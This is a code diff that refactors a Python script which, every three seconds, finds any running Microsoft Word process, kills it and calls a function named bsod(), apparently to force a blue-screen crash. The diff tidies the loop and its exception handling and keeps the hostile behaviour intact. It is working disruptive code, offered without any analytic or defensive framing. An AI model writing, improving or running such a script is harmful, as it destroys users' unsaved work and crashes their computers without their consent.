@@ -28,15 +28,13 @@ def bsod():
     )
 
 
-while True:
-    list = psutil.pids()
-    for i in range(0, len(list)):
-        try:
-            p = psutil.Process(list[i])
-            if p.cmdline()[0].find("WINWORD.EXE") != -1:
-                p.kill()
-                bsod()
-                break;
-        except:
-            pass
-    time.sleep(3)
+if __name__ == "__main__":
+    while True:
+        for p in psutil.process_iter(attrs=["cmdline"]):
+            try:
+                if p.info["cmdline"] and "WINWORD.EXE" in p.info["cmdline"][0]:
+                    p.kill()
+                    bsod()
+            except (psutil.NoSuchProcess, psutil.AccessDenied, IndexError):
+                pass
+        time.sleep(3)
